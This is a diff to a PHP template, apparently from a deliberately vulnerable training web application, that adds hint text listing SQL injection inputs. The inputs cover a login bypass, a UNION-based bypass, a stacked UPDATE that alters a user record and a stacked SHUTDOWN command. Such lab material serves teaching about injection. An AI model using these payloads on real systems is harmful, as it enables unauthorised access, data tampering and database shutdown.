@@ -75,7 +75,11 @@
 <?php if(BACKEND_IMPLEMENTATION < 3): ?>
 <i>Enter <code>')) or '1' = (('1</code> in the password box to bypass login using sql injection.</i>
 <br/>
-<i>Enter <code>' ; UPDATE users SET uActivity = '2000-01-01' where uUsername='hacker'; --'</code> in the username box to perform join sql injection. 
+<i>Enter <code>' UNION select userId from users; --</code> in the usernam3 box to bypass login using UNION sql injection.</i>
+<br/>
+<i>Enter <code>' ; UPDATE users SET uActivity = '2000-01-01' where uUsername='hacker'; --'</code> in the username box to perform join sql injection.</i>
+<br/> 
+<i>Enter <code>' ; SHUTDOWN; --'</code> to execite stored procedure.
 </i>
 <script src="/templates/copy_code.js"></script>
 <?php endif ?>
